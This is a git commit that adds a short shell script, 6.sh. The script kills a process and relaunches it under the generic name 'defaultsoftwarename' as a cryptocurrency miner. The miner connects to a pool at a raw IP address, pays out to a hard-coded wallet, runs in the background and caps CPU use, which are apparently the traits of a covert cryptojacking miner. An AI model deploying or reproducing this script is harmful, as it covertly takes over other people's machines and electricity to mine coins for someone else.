7be4c81a9bd35172f2e38832c0df01ecc6ac6918
Kyki2281488 <57642299+Kyki2281488@users.noreply.github.com>
2019-11-12 05:50:59 +0800

    Add files via upload

---
+++ 6.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o 23.227.194.41:57298 -u 4B7UMJRmN7qFsb3zhPbs9e4vEySLQk5WJJSxmES1YMjCCCeV2mcZ4KtMihQxbPms6dbuDpsLUveB4iTELrhPDRyBCT7AduR --pass=x:kyki2281488@mail.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1 --variant -1
